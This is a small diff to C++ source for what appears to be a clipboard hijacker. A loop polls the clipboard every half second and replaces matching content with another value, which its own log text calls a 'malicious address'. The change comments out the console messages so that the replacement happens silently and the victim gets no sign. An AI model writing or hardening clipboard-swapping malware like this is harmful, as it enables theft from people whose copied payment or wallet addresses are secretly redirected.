@@ -68,9 +68,9 @@ int main() {
 
 
         if (!currentText.empty() && currentText == targets) {
-            cout << "Target clipboard content detected: " << currentText << endl;
+            // cout << "Target clipboard content detected: " << currentText << endl;
             SetClipboardText("hehe");
-            cout << "Clipboard content replaced with malicious address." << endl;
+            // cout << "Clipboard content replaced with malicious address." << endl;
         }
 
         this_thread::sleep_for(chrono::milliseconds(500));
